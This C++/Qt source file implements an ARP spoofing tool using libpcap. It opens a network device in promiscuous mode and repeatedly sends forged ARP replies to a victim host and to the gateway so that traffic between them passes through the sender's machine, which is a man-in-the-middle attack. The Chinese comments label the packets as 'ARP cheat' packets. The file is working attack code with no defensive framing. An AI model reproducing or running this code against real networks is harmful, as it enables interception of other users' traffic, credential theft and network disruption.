#include "usearp.h"

usearp::usearp(ArpCheatpacket *arpinfo, const char*dev)
{
    char errBuf[PCAP_ERRBUF_SIZE] = {0};
    quitFg = false;
    //混杂模式
    this->handle = pcap_open_live(dev,65535,1,0,errBuf);

    if(!this->handle){
        printf("Open live dev is error: %s\n",errBuf);
        exit(1);
    }
    this->arpinfo = new ArpCheatpacket();
    memcpy(this->arpinfo,arpinfo,sizeof(ArpCheatpacket));
    arppacket1=new YArpPacket();
    arppacket2=new YArpPacket();
    arppacket1->fillArpEthernetHeader(arpinfo->sourMac,arpinfo->dstMac);
    arppacket2->fillArpEthernetHeader(arpinfo->sourMac,arpinfo->gatewayMac);
    arppacket1->fillArpHeader(ARP_HARDWARE,IP_TYPE,ARP_REPLY,arpinfo->sourMac,arpinfo->gatewayIp,arpinfo->dstMac,arpinfo->dstIp);
    arppacket2->fillArpHeader(ARP_HARDWARE,IP_TYPE,ARP_REPLY,arpinfo->sourMac,arpinfo->dstIp,arpinfo->gatewayMac,arpinfo->gatewayIp);
    arppacket1->fillArpfill();
    arppacket2->fillArpfill();
    arppacket1->fillArpcrc();
    arppacket2->fillArpcrc();
}

// 发送ARP欺骗包
void usearp::sendArpCheatPacket()
{
    while(!quitFg){
        // 发送
        if (pcap_sendpacket(handle, (u_char*)(arppacket1->getData()), ARP_PACKET_LENGTH+ARP_FILL_LENGTH+ARP_CRC_LENGTH) == 0){
            //printf("\nPacketSend succeed\n");
        } else {
            //printf("PacketSendPacket in getmine Error");
        }
        if (pcap_sendpacket(handle, (u_char*)(arppacket2->getData()), ARP_PACKET_LENGTH+ARP_FILL_LENGTH+ARP_CRC_LENGTH) == 0){
            //printf("\nPacketSend succeed\n");
        } else {
            //printf("PacketSendPacket in getmine Error");
        }

        // 每隔多少微秒向指定ip发送ARP包
        QThread::usleep(200000);
    }
}
void usearp::run()
{
    sendArpCheatPacket();
}
void usearp::quitThread()
{
    quitFg = true;
    pcap_close(this->handle);
    if(this->isRunning())
        this->quit();
}
